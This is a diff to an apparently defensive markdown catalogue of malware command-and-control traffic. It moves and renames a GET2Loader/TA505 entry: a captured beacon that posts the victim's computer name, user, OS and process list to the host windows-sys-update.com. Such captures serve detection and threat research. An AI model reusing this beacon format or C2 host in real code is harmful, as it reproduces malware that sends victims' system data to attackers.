@@ -429,6 +429,23 @@ Sbh=A2oUV0jxRNQErH6gY3lxQtOCTuQwNTdWJ25sTcda3oav(0QcLnkBrePt5vgAKuqyhbAftuJA5G5D
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/formbook.png "Formbook")
 
+#### GET2Loader (TA505):
+~~~
+POST /2021 HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
+Content-Length: 95
+Host: windows-sys-update.com
+
+&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
+Server: nginx/1.10.3
+Date: Wed, 09 Oct 2019 18:53:18 GMT
+Content-Length: 0
+Connection: keep-alive
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")
+
 #### Glupteba
 ~~~
 POST /bots/post-ia-data?uuid=de7cfeb2-8d6a-480d-9043-488b8a616d7b HTTP/1.1
@@ -1305,23 +1322,6 @@ Host: thankg1.org
 ......qV4`..Pu*...8W.........M .h.v.S.:.
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")
-
-#### TA505 Loader:
-~~~
-POST /2021 HTTP/1.1
-Connection: Keep-Alive
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
-Content-Length: 95
-Host: windows-sys-update.com
-
-&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
-Server: nginx/1.10.3
-Date: Wed, 09 Oct 2019 18:53:18 GMT
-Content-Length: 0
-Connection: keep-alive
-~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")
 
 #### Trickbot
 ~~~
